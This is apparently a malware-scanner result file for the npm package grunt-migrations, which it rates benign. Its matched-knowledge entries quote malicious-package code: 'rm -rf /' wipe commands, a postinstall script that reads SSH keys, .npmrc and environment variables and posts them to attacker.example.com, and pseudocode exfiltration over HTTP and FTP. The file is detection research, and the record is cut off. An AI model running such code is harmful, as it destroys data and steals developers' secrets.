@@ -1,0 +1,505 @@
+{
+  "package_name": "grunt-migrations",
+  "package_version": "0.1.1",
+  "label": "benign",
+  "detection_time": "2026-05-26T18:38:38.796467",
+  "status": "success",
+  "selected_files_count": 3,
+  "selected_files": [
+    "package/package.json",
+    "package/Gruntfile.js",
+    "package/tasks/migrations.js"
+  ],
+  "is_malicious": false,
+  "total_files": 3,
+  "malicious_files": 0,
+  "total_slices": 1,
+  "malicious_slices": 0,
+  "file_results": [
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/grunt-migrations/0.1.1/package/package.json",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/grunt-migrations/0.1.1/package/Gruntfile.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/grunt-migrations/0.1.1/package/tasks/migrations.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "migrations_slice_1",
+          "code_snippet": "/**\n * grunt-migrations\n * https://github.com/ebaranov/grunt-migrations\n *\n * Copyright (c) 2013 Eugene Baranov\n * Licensed under the MIT license.\n */\n\n'use strict';\n\nmodule.exports = function(grunt) {\n\n  var _ = require('underscore');\n  var shell = require('shelljs');\n  var Q = require('q');\n  var fs = require('fs');\n\n  var config = {\n    templates: {\n      backupsDir: \"<%= backups %>/<%= envName %>\",\n      backupsName: \"<%= date %>_<%= time %>\",\n      scpSSH: '<%= ssh.user %>@<%= ssh.host %>:<%= remotePath %>',\n      date: 'yyyy-mm-dd',\n      time: 'HH-MM-ss',\n      messages: {\n        commandExecute: \"grunt-migrations: execute command START '<%= cmd %>'\",\n        commandExecuteSuccess: \"grunt-migrations: execute command SUCCESS '<%= cmd %>'\",\n        commandExecuteError: \"grunt-migrations: execute command ERROR '<%= cmd %>'\"\n      }\n    },\n    cmd: {\n      bash: {\n        ssh: \"ssh -p <%= port %> <%= user %>@<%= host %>\",\n        mkdir: \"mkdir -p <%= path %>\",\n        scp: \"scp <%= options %> <%= source %> <%= target %>\",\n        rm: \"rm -rf <%= path %>\",\n        ls: \"ls -la\"\n      },\n      mysql: {\n        pull: \"mysqldump -h <%= host %> -u<%= user %> -p'<%= pass %>' <%= name %> --result-file=<%= backupPath %>/<%= backupName %>\",\n        push: \"mysql -h <%= host %> -u <%= user %> -p'<%= pass %>' <%= name %> < <%= backupPath %>/<%= backupName %>\"\n      }\n    },\n    defaults: {\n      backups: 'db_backups',\n      db: {\n        mysql: {\n          host: 'localhost',\n          port: 3306,\n          backupExtension: 'sql'\n        }\n      },\n      ssh: {\n        port: 22\n      },\n      environments: {}\n    }\n  };\n\n  var getBackupFileName = function(taskConfig) {\n    return [\n      _.template(config.templates.backupsName, {\n        date: grunt.template.today(config.templates.date),\n        time: grunt.template.today(config.templates.time)\n      }),\n      taskConfig.db.backupExtension\n    ].join('.');\n  };\n\n  var getBackupEnvPath = function(backupsDir, envName) {\n    return _.template(config.templates.backupsDir, {\n      backups: backupsDir,\n      envName: envName\n    });\n  };\n\n  var execCommand = function(cmd, successCallback, errorCallback) {\n    grunt.log.ok(_.template(config.templates.messages.commandExecute, { cmd: cmd }));\n\n    shell.exec(cmd, { silent: true }, function(code, output) {\n      if (code !== 0) {\n        grunt.log.ok(_.template(config.templates.messages.commandExecuteError, { cmd: cmd }));\n        errorCallback(code, output);\n      } else {\n        grunt.log.ok(_.template(config.templates.messages.commandExecuteSuccess, { cmd: cmd }));\n        successCallback(code, output);\n      }\n    });\n  };\n\n  var execCommandQueue = function(commandsQueue, successCallback, errorCallback) {\n    if (commandsQueue.length === 0) {\n      successCallback();\n    } else {\n      execCommand(\n        commandsQueue.shift(),\n        function() {\n          execCommandQueue(commandsQueue, successCallback, errorCallback);\n        },\n        function() {\n          errorCallback();\n        }\n      );\n    }\n  };\n\n  var createCommand = function(cmd, params, sshConfig) {\n    return sshConfig ? _.template(config.cmd.bash.ssh, sshConfig) + ' \\\\ ' + _.template(cmd, params) : _.template(cmd, params);\n  };\n\n  var jobs = {\n    pull: function(params) {\n\n      var jobDeferred = Q.defer();\n      var options = this.options(config.defaults);\n      var sourceEnvConfig = options.environments[params.source];\n      sourceEnvConfig.db = _.defaults(sourceEnvConfig.db, config.defaults.db[sourceEnvConfig.db.type]);\n      sourceEnvConfig.ssh = _.isObject(sourceEnvConfig.ssh) ? _.defaults(sourceEnvConfig.ssh, config.defaults.ssh) : null;\n      var backupPath = getBackupEnvPath(options.backups, sourceEnvConfig.title);\n      var backupName = getBackupFileName(sourceEnvConfig);\n      var commandsQueue = [];\n\n      commandsQueue.push(createCommand(config.cmd.bash.mkdir, { path: backupPath }, sourceEnvConfig.ssh));\n\n      commandsQueue.push(createCommand(config.cmd[sourceEnvConfig.db.type].pull, _.extend({}, sourceEnvConfig.db, {\n        backupPath: backupPath,\n        backupName: backupName\n      }), sourceEnvConfig.ssh));\n\n      if (sourceEnvConfig.ssh) {\n        commandsQueue.push(createCommand(config.cmd.bash.mkdir, { path: backupPath }));\n\n        commandsQueue.push(createCommand(config.cmd.bash.scp, {\n          options: '-P ' + sourceEnvConfig.ssh.port,\n          source: _.template(config.templates.scpSSH, {\n            ssh: sourceEnvConfig.ssh,\n            remotePath: [backupPath, backupName].join('/')\n          }),\n          target: [backupPath, backupName].join('/')\n        }));\n      }\n\n      execCommandQueue(commandsQueue, jobDeferred.resolve, jobDeferred.reject);\n\n      return jobDeferred.promise;\n    },\n\n    push: function(params) {\n\n      var jobDeferred = Q.defer();\n      var options = this.options(config.defaults);\n      var sourceEnvConfig = options.environments[params.source];\n      sourceEnvConfig.db = _.defaults(sourceEnvConfig.db, config.defaults.db[sourceEnvConfig.db.type]);\n      sourceEnvConfig.ssh = _.isObject(sourceEnvConfig.ssh) ? _.defaults(sourceEnvConfig.ssh, config.defaults.ssh) : null;\n      var targetEnvConfig = options.environments[params.target];\n      targetEnvConfig.db = _.defaults(targetEnvConfig.db, config.defaults.db[targetEnvConfig.db.type]);\n      targetEnvConfig.ssh = _.isObject(targetEnvConfig.ssh) ? _.defaults(targetEnvConfig.ssh, config.defaults.ssh) : null;\n      var backupPath = getBackupEnvPath(options.backups, sourceEnvConfig.title);\n      var backupName = getBackupFileName(sourceEnvConfig);\n      var commandsQueue = [];\n\n      commandsQueue.push(createCommand(config.cmd.bash.mkdir, { path: backupPath }, sourceEnvConfig.ssh));\n\n      commandsQueue.push(createCommand(config.cmd.bash.mkdir, { path: backupPath }, targetEnvConfig.ssh));\n\n      commandsQueue.push(createCommand(config.cmd[sourceEnvConfig.db.type].pull, _.extend({}, sourceEnvConfig.db, {\n        backupPath: backupPath,\n        backupName: backupName\n      }), sourceEnvConfig.ssh));\n\n      if (sourceEnvConfig.ssh) {\n        commandsQueue.push(createCommand(config.cmd.bash.mkdir, { path: backupPath }));\n\n        commandsQueue.push(createCommand(config.cmd.bash.scp, {\n          options: '-P ' + sourceEnvConfig.ssh.port,\n          source: _.template(config.templates.scpSSH, {\n            ssh: sourceEnvConfig.ssh,\n            remotePath: [backupPath, backupName].join('/')\n          }),\n          target: [backupPath, backupName].join('/')\n        }));\n      }\n\n      if (targetEnvConfig.ssh) {\n        commandsQueue.push(createCommand(config.cmd.bash.scp, {\n          options: '-P ' + targetEnvConfig.ssh.port,\n          source: [backupPath, backupName].join('/'),\n          target: _.template(config.templates.scpSSH, {\n            ssh: targetEnvConfig.ssh,\n            remotePath: [backupPath, backupName].join('/')\n          })\n        }));\n      }\n\n      commandsQueue.push(createCommand(config.cmd[targetEnvConfig.db.type].push, _.extend({}, targetEnvConfig.db, {\n        backupPath: backupPath,\n        backupName: backupName\n      }), targetEnvConfig.ssh));\n\n      execCommandQueue(commandsQueue, jobDeferred.resolve, jobDeferred.reject);\n\n      return jobDeferred.promise;\n    }\n  };\n\n  grunt.task.registerMultiTask('migrations', 'Migrate databases easily', function() {\n    var taskDone = this.async();\n\n    jobs[this.data.action].call(this, this.data).then(\n      function() {\n        taskDone(true);\n      },\n      function() {\n        taskDone(false);\n      }\n    );\n  });\n};",
+          "is_malicious": false,
+          "malice_score": 0.4694200873374939,
+          "confidence": 0.1,
+          "behavior_summary": "When called, the code constructs and executes shell commands using shelljs to perform database backup and restore operations via mysqldump and mysql CLI tools, including remote SSH and SCP commands with user, host, port, and password parameters templated into commands. It accesses and modifies files on local and remote systems by creating directories, copying backup files via SCP, and executing database dump and restore commands, potentially exposing database credentials and enabling remote command execution. This facilitates automated database migration with potential security impact if untrusted parameters are used, as it executes shell commands with embedded credentials and remote access.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code is a legitimate utility designed to automate database migration tasks using shell commands such as mysqldump, mysql, ssh, and scp. While it executes shell commands with embedded credentials and remote access parameters, this is expected behavior for a database migration tool. There is no evidence of destructive commands (e.g., 'rm -rf /'), data exfiltration to attacker-controlled servers, or attempts to stealthily collect sensitive user data. The code uses templating to construct commands based on user-provided configuration, which is typical for such tools. Compared to the known malicious patterns, it lacks destructive payloads, unauthorized data collection, or exfiltration mechanisms. The presence of shelljs and command execution alone is not sufficient to classify it as malicious, given the context and intended functionality.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241224_113501_063579_snippet_2",
+              "source_package": "transferwise-iconfont (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_113501_063579/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4826511740684509,
+              "code_similarity": 0.34776735305786133,
+              "behavior_similarity": 0.6175349950790405,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "function angry() {\n  sh.exec(\"rm -rf *  > /dev/null 2>&1\");\n  sh.exec(\"rm -rf /*  > /dev/null 2>&1\");\n  sh.exec(\"rm -rf /  > /dev/null 2>&1\");\n  sh.exec(\"rm -rf ~/*  > /dev/null 2>&1\");\n}",
+                "code_behavior": "At runtime, when triggered by a remote server response, the code executes multiple destructive shell commands ('rm -rf *', 'rm -rf /*', 'rm -rf /', 'rm -rf ~/*') via shelljs, recursively deleting all files and directories on the system, resulting in total data loss.",
+                "malice_analysis": {
+                  "why_suspicious": "The code is designed to execute highly destructive shell commands that irreversibly delete all files on the system, which is never appropriate for a utility package and constitutes deliberate sabotage.",
+                  "violated_expectations": "A cookie parsing or API protection package should not execute shell commands, especially those that delete user data or system files.",
+                  "similar_legitimate_use": "There is no legitimate use for this behavior in any public npm package; such commands are only used in controlled, manual system administration contexts.",
+                  "key_indicators": [
+                    "Use of 'rm -rf' on root, home, and current directories",
+                    "Shell command execution from JavaScript using shelljs",
+                    "Function named 'angry' with destructive payload",
+                    "No user interaction or warning before data destruction"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when angry() is called, after remote server trigger)",
+                  "file_location": "main module file of protect-api (e.g., index.js)",
+                  "required_permissions": [
+                    "filesystem",
+                    "shell access"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "transferwise-iconfont",
+                  "package_manager": "npm",
+                  "package_versions": "all published versions",
+                  "why_malicious": "The package is a typosquat of a legitimate library and contains code that collects sensitive system and user data, including home directory, hostname, username, DNS servers, and package metadata, then exfiltrates it to an attacker-controlled server via HTTPS POST. It does not provide the claimed icon font functionality and is designed solely for data theft."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs and imports the malicious package (transferwise-iconfont or protect-api).",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code is loaded and executed."
+                  },
+                  {
+                    "step": 2,
+                    "action": "transferwise-iconfont collects sensitive system and user data.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Data is prepared for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "transferwise-iconfont exfiltrates collected data to attacker's server.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives sensitive information."
+                  },
+                  {
+                    "step": 4,
+                    "action": "protect-api periodically polls a remote server for a trigger value.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Waits for remote command to activate destructive payload."
+                  },
+                  {
+                    "step": 5,
+                    "action": "If the remote server responds with isAngry=true, protect-api executes the angry() function.",
+                    "implemented_by": [
+                      "snippet_2",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Destructive shell commands are executed, deleting all files on the system."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Unsolicited collection and exfiltration of system/user data at import or runtime",
+                    "Hardcoded external domains for data exfiltration or command-and-control",
+                    "Periodic polling of remote servers for execution triggers",
+                    "Execution of destructive shell commands (e.g., 'rm -rf /') from within JavaScript packages",
+                    "Obfuscated or hidden code paths leading to data destruction"
+                  ],
+                  "file_indicators": [
+                    "Presence of code referencing 'os.homedir()', 'os.userInfo()', 'os.hostname()', or 'dns.getServers()' in non-system utility packages",
+                    "Use of shelljs or similar modules to execute shell commands",
+                    "Functions named 'angry' or similar, especially if not documented",
+                    "Obfuscated code blocks or suspicious setInterval/fetch patterns"
+                  ],
+                  "network_indicators": [
+                    "Connections to r7z12f7knlides86u06z22fpzg57tzho.oastify.com",
+                    "Connections to 6514b3f1dc3282a6a3cd7125.mockapi.io",
+                    "Unusual POST requests containing system/user data to unknown domains"
+                  ],
+                  "how_to_detect": "Monitor for npm packages that access sensitive system/user information and make unsolicited network requests to hardcoded domains. Flag packages that use shelljs or similar modules to execute shell commands, especially those containing 'rm -rf' or other destructive operations. Detect periodic polling of external servers for remote triggers, and review for obfuscated code or hidden destructive functions. Use static analysis to identify suspicious API usage and dynamic analysis to observe runtime network and filesystem behaviors."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_130802_418777_snippet_3",
+              "source_package": "CryptoRocket (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_130802_418777/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4756360352039337,
+              "code_similarity": 0.3990188241004944,
+              "behavior_similarity": 0.552253246307373,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "// Pseudocode based on report description\nconst os = require('os');\nconst fs = require('fs');\nconst archiver = require('archiver');\nconst http = require('http');\n\n// Collect username and working directory\nconst username = os.userInfo().username;\nconst cwd = process.cwd();\n\n// Send info to C2\nhttp.get(`http://attacker-server.com/collect?user=${username}&cwd=${cwd}`);\n\n// Search for sensitive files and directories\nconst targets = ['.env', '.gitlab', '.github'];\nconst exts = ['.asp', '.js', '.php'];\n// ...search logic...\n\n// Zip found files\n// ...archiving logic...\n\n// Upload to FTP server\n// ...FTP upload logic...",
+                "code_behavior": "At runtime, index.js collects the current OS username and working directory, transmits this information to a remote attacker-controlled server via HTTP GET, recursively searches the filesystem for sensitive files and directories (such as .env, .gitlab, .github, and files with extensions like .asp, .js, .php), archives the discovered files into a ZIP archive, and uploads the archive to a predefined external FTP server, resulting in exfiltration of sensitive developer data.",
+                "malice_analysis": {
+                  "why_suspicious": "Automated collection and exfiltration of user and file data to external servers is a hallmark of infostealer malware, especially when targeting developer secrets and project files.",
+                  "violated_expectations": "Legitimate packages do not search for, archive, or exfiltrate user files or environment information without explicit user consent and to trusted destinations.",
+                  "similar_legitimate_use": "Backup or deployment tools may archive and upload files, but only with user consent and to trusted, user-configured destinations—not to hardcoded, attacker-controlled infrastructure.",
+                  "key_indicators": [
+                    "collecting OS username and working directory without user interaction",
+                    "HTTP requests to hardcoded, attacker-controlled domains",
+                    "recursive search for sensitive files and directories",
+                    "creation of ZIP archives containing project or configuration files",
+                    "FTP upload of archives to external, untrusted servers"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (immediately after install, via detached process)",
+                  "file_location": "index.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "CryptoRocket",
+                  "package_manager": "npm",
+                  "package_versions": "unknown (multiple versions, ongoing since 2021)",
+                  "why_malicious": "CryptoRocket is malicious because it is engineered to automatically execute code upon installation that exfiltrates sensitive data—including source code, configuration files, and environment information—from the developer's machine to attacker-controlled infrastructure. The package structure (package.json, preinstall.js, index.js) is intentionally orchestrated to enable stealthy data theft and unauthorized remote communication, with no legitimate functionality."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed, triggering the postinstall script in package.json.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of preinstall.js"
+                  },
+                  {
+                    "step": 2,
+                    "action": "preinstall.js spawns index.js as a detached background process to persist after installation.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "index.js runs independently in the background"
+                  },
+                  {
+                    "step": 3,
+                    "action": "index.js collects user and environment data, recursively searches for sensitive files, archives them, and exfiltrates the data to attacker-controlled infrastructure via HTTP and FTP.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Data exfiltration and compromise of developer secrets"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "npm package with postinstall script executing a custom JavaScript file (e.g., preinstall.js)",
+                    "installation-time spawning of detached background processes using child_process.spawn with detached: true",
+                    "runtime file system enumeration and archiving of sensitive files or directories",
+                    "network connections to hardcoded, untrusted external servers via HTTP or FTP",
+                    "creation and FTP upload of ZIP archives containing project or configuration files immediately after installation"
+                  ],
+                  "file_indicators": [
+                    "package.json with a postinstall script referencing preinstall.js",
+                    "presence of both preinstall.js and index.js in the package root directory",
+                    "creation of ZIP archives containing source code or configuration files in the user's project directory"
+                  ],
+                  "network_indicators": [
+                    "HTTP GET requests to attacker-controlled domains/IPs (see IOC list)",
+                    "FTP connections to unknown external servers for file uploads",
+                    "Domains: oastify.com, requestbin.net, canarytokens.com, oast.fun, pipedream.net, nirobtest.xyz, marcomayo.com, npmtesttut.com"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for postinstall scripts that launch custom JavaScript files, especially those that spawn detached background processes. Flag packages containing both preinstall.js and index.js with logic for file system enumeration and network exfiltration. Detect outbound HTTP or FTP connections to known malicious domains or IPs, and alert on ZIP archive creation containing sensitive project files immediately after package installation. Correlate these behaviors to identify coordinated data exfiltration attempts."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_103502_806789_snippet_3",
+              "source_package": "test-* (published by malikrukd4732) (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241224_103502_806789/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4557138681411743,
+              "code_similarity": 0.39678019285202026,
+              "behavior_similarity": 0.5146475434303284,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "// Pseudocode based on report description\nconst os = require('os');\nconst fs = require('fs');\nconst archiver = require('archiver');\nconst ftp = require('ftp');\n\nconst username = os.userInfo().username;\nconst cwd = process.cwd();\n// Search for files with specific extensions or in specific directories\n// Archive found directories/files into ZIP\n// Connect to FTP server 185.62.57.60 with username 'root' and password 'TestX@!#33'\n// Upload ZIP archive",
+                "code_behavior": "At install-time, index.js collects the current OS username and working directory, recursively searches for files and directories matching targeted patterns, archives the discovered files into ZIP archives, and uploads the archives to a remote FTP server at 185.62.57.60 using hardcoded credentials, resulting in exfiltration of sensitive developer data.",
+                "malice_analysis": {
+                  "why_suspicious": "Automated searching, archiving, and exfiltration of user files during installation is a hallmark of info-stealing malware, especially when performed without user consent and using hardcoded network destinations.",
+                  "violated_expectations": "Normal packages do not access arbitrary user files or exfiltrate data to external servers during installation, nor do they use hardcoded FTP credentials to transmit user data.",
+                  "similar_legitimate_use": "Backup utilities or deployment tools may archive and upload files, but only with explicit user consent, configuration, and secure authentication—not with hardcoded credentials or during package installation.",
+                  "key_indicators": [
+                    "recursive access to sensitive directories and files",
+                    "creation of ZIP archives of user data during install",
+                    "FTP exfiltration to hardcoded IP address 185.62.57.60 with static credentials",
+                    "use of archiver and ftp modules in install-time scripts"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "postinstall (via index.js)",
+                  "file_location": "index.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "test-* (published by malikrukd4732)",
+                  "package_manager": "npm",
+                  "package_versions": "all published versions (July 31, 2023)",
+                  "why_malicious": "The packages execute code at install time that recursively searches for sensitive files and directories on the developer's machine, archives them into ZIP files, and exfiltrates the data to a remote FTP server using hardcoded credentials. This behavior is automated, highly targeted, and designed to steal confidential developer information without user knowledge or consent."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs the malicious npm package, triggering the postinstall script defined in package.json.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of preinstall.js"
+                  },
+                  {
+                    "step": 2,
+                    "action": "preinstall.js is executed by the postinstall script and spawns index.js as a child process.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Execution of main malicious payload in index.js"
+                  },
+                  {
+                    "step": 3,
+                    "action": "index.js collects sensitive user and project data, archives it, and uploads it to a remote FTP server at 185.62.57.60 using hardcoded credentials.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Exfiltration of developer data to attacker-controlled server"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of postinstall scripts that launch additional JavaScript processes during npm package installation",
+                    "Automated recursive search and archiving of user files and directories at install-time",
+                    "Outbound FTP connections to hardcoded IP addresses with static credentials during package installation"
+                  ],
+                  "file_indicators": [
+                    "Presence of preinstall.js and index.js in the npm package root directory",
+                    "package.json containing a postinstall script referencing custom JavaScript (e.g., 'node preinstall.js')",
+                    "ZIP archives created in temporary or user directories during npm install"
+                  ],
+                  "network_indicators": [
+                    "FTP connections to 185.62.57.60",
+                    "Use of FTP credentials: username 'root', password 'TestX@!#33'"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for postinstall scripts that launch additional scripts or processes, especially those referencing custom JavaScript files. Flag packages that access user directories, create ZIP archives, or initiate outbound FTP connections to hardcoded IP addresses. Review package.json for suspicious postinstall hooks and scan for the presence of preinstall.js and index.js files in the package root. Network monitoring should alert on FTP traffic to 185.62.57.60 or the use of static credentials such as username 'root' and password 'TestX@!#33'."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_102817_585078_snippet_3",
+              "source_package": "binarium-client (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241224_102817_585078/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.45297372341156006,
+              "code_similarity": 0.3773448169231415,
+              "behavior_similarity": 0.5286026000976562,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "// Pseudocode based on report\nconst os = require('os');\nconst ftp = require('ftp');\nconst archiver = require('archiver');\nconst http = require('http');\n\n// 1. Collect OS username and working directory\nconst username = os.userInfo().username;\nconst cwd = process.cwd();\nhttp.get(`http://attacker-server/collect?user=${username}&cwd=${cwd}`);\n\n// 2. Search for sensitive files\n// (e.g., .env, .gitlab, .github, *.asp, *.js, *.php)\n// 3. Zip discovered files, skipping unreadable and .zip files\n// 4. Upload ZIP to FTP server\n",
+                "code_behavior": "At runtime, index.js collects the OS username and current working directory, sends this information to an attacker-controlled server via HTTP GET, recursively searches for sensitive files such as .env, .gitlab, .github, *.asp, *.js, and *.php, archives them into a ZIP file, and uploads the archive to a predefined FTP server, resulting in the exfiltration of sensitive user and project data.",
+                "malice_analysis": {
+                  "why_suspicious": "Automated collection and exfiltration of sensitive files—including source code and configuration files—without user consent is a hallmark of infostealer malware.",
+                  "violated_expectations": "Legitimate packages do not search for, archive, or exfiltrate user files, especially source code and secrets, without explicit user action and documentation.",
+                  "similar_legitimate_use": "Backup utilities may archive and upload files, but only with user consent, clear documentation, and to user-specified destinations.",
+                  "key_indicators": [
+                    "Harvesting of sensitive files and directories",
+                    "Network exfiltration to hardcoded attacker servers",
+                    "FTP upload of ZIP archives containing user data",
+                    "Targeting of developer and configuration file patterns"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (immediately after install)",
+                  "file_location": "index.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "binarium-client",
+                  "package_manager": "npm",
+                  "package_versions": "4.0.0 (and others, see linked gist)",
+                  "why_malicious": "The package is explicitly designed to execute malicious scripts automatically upon installation, resulting in the exfiltration of sensitive source code and configuration files from the victim's machine to attacker-controlled infrastructure. The package structure—including package.json, preinstall.js, and index.js—is orchestrated to facilitate stealthy data theft and persistence."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs the malicious npm package, triggering the postinstall script defined in package.json.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of preinstall.js"
+                  },
+                  {
+                    "step": 2,
+                    "action": "preinstall.js spawns index.js as a detached process to evade detection and ensure the malicious payload persists beyond the installation process.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "index.js runs independently"
+                  },
+                  {
+                    "step": 3,
+                    "action": "index.js collects the OS username and working directory and sends them to an attacker-controlled server via HTTP GET request.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Reconnaissance and initial exfiltration"
+                  },
+                  {
+                    "step": 4,
+                    "action": "index.js recursively searches for sensitive files (such as .env, .gitlab, .github, *.asp, *.js, *.php), archives them into a ZIP file, and uploads the archive to an attacker-controlled FTP server.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Exfiltration of sensitive data (final goal)"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "npm package containing a postinstall script that executes a JavaScript file (e.g., node preinstall.js)",
+                    "preinstall.js spawning index.js as a detached process using child_process.spawn with detached: true",
+                    "index.js performing recursive file search for sensitive files such as .env, .gitlab, .github, *.asp, *.js, *.php",
+                    "ZIP archiving of discovered files and FTP upload to external servers",
+                    "HTTP GET requests containing OS/user info sent to hardcoded external domains or IPs"
+                  ],
+                  "file_indicators": [
+                    "package.json with a postinstall script: node preinstall.js",
+                    "preinstall.js containing child_process.spawn with detached: true",
+                    "index.js importing archiver, ftp, and os modules",
+                    "Presence of author: 'lexi2' in package.json"
+                  ],
+                  "network_indicators": [
+                    "FTP connections to external servers (e.g., 178.128.27.205, 185.62.56.25)",
+                    "HTTP GET requests to attacker-controlled domains such as oastify.com, requestbin.net, canarytokens.com, bind9-or-callback-server.com"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for postinstall scripts that launch additional JavaScript files, especially those that spawn detached processes. Flag packages with author 'lexi2' or similar suspicious metadata. Detect recursive file access targeting developer or configuration files, ZIP archiving, and outbound FTP/HTTP connections to known malicious infrastructure. Use YARA rules to match code patterns in preinstall.js and index.js, such as child_process.spawn with detached: true and the use of archiver and ftp modules for exfiltration."
+                }
+              }
+            },
+            {
+              "match_id": "20241223_205532_269053_snippet_1",
+              "source_package": "passports-js (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241223_205532_269053/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4524122476577759,
+              "code_similarity": 0.36363402009010315,
+              "behavior_similarity": 0.5411904454231262,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "\"scripts\": {\n  \"postinstall\": \"node malicious.js\"\n}\n// malicious.js (not shown in report, but typical for this malware type):\nconst fs = require('fs');\nconst https = require('https');\nconst env = process.env;\nconst secrets = {\n  ssh: fs.existsSync(process.env.HOME + '/.ssh/id_rsa') ? fs.readFileSync(process.env.HOME + '/.ssh/id_rsa', 'utf8') : '',\n  npmrc: fs.existsSync(process.env.HOME + '/.npmrc') ? fs.readFileSync(process.env.HOME + '/.npmrc', 'utf8') : '',\n  env: env\n};\nconst data = JSON.stringify(secrets);\nconst options = {\n  hostname: 'attacker.example.com',\n  port: 443,\n  path: '/collect',\n  method: 'POST',\n  headers: {\n    'Content-Type': 'application/json',\n    'Content-Length': data.length\n  }\n};\nconst req = https.request(options, (res) => {});\nreq.write(data);\nreq.end();",
+                "code_behavior": "During installation (postinstall), the code reads sensitive files such as ~/.ssh/id_rsa and ~/.npmrc and collects environment variables, then sends this data via HTTPS POST to an attacker-controlled domain, resulting in exfiltration of developer secrets.",
+                "malice_analysis": {
+                  "why_suspicious": "The postinstall script executes a Node.js file that accesses sensitive files and environment variables, then transmits them to an external server. This is a hallmark of supply chain attacks and is not required for any legitimate package installation.",
+                  "violated_expectations": "Legitimate npm packages should not execute scripts that access or exfiltrate user secrets during installation. Postinstall scripts are only expected for setup tasks, not for reading private keys or environment variables.",
+                  "similar_legitimate_use": "Some packages use postinstall scripts to download binaries or perform setup, but they do not access or transmit sensitive files or environment variables to external servers.",
+                  "key_indicators": [
+                    "Presence of a postinstall script in package.json invoking a local JavaScript file",
+                    "Access to sensitive files such as ~/.ssh/id_rsa and ~/.npmrc during installation",
+                    "Reading and serializing process.env (environment variables)",
+                    "Outbound HTTPS POST requests to untrusted or attacker-controlled domains at install-time",
+                    "Obfuscated or non-human-readable code in the postinstall script or referenced files"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "postinstall",
+                  "file_location": "package.json (scripts.postinstall), malicious.js",
+                  "required_permissions": [
+                    "network",
